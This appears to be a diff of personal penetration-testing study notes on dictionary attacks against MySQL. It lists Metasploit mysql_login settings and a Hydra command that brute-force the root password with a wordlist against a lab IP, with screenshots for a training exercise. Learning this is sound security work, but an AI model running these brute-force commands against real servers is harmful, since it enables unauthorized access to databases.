@@ -2525,9 +2525,33 @@ Een MySQL dictionary-aanval is een aanvalsvector waarbij een aanvaller probeert 
 - run a service scan 
 - utalize msfconsole and an auxiliary scanner to brute force the login 
 	- use auxiliary.scanner/mysql/mysql_login
-	- set pass_file 
+	- set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
+	- set verbose  false 
+	- set stop_on_success true (we only need one password for username )
+	- set username root 
+	  
+- Another way to bruteforce login: 
+	hydra 
+	- hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ip mysql 
+	
 
 
+-- Lab --- 
+192.124.83.3
+
+1. Find the password of user “root” which is required to access the MySQL server. Use suitable metasploit module with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+   
+   ![[Pasted image 20230613142719.png]]
+   
+   
+   
+   
+2. Find the password of user “root” which is required to access the MySQL server. Use Hydra with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.124.83.3 mysql 
+
+![[Pasted image 20230613143053.png]]
 
 
-  
+### MSSQL Nmap scripts 
+
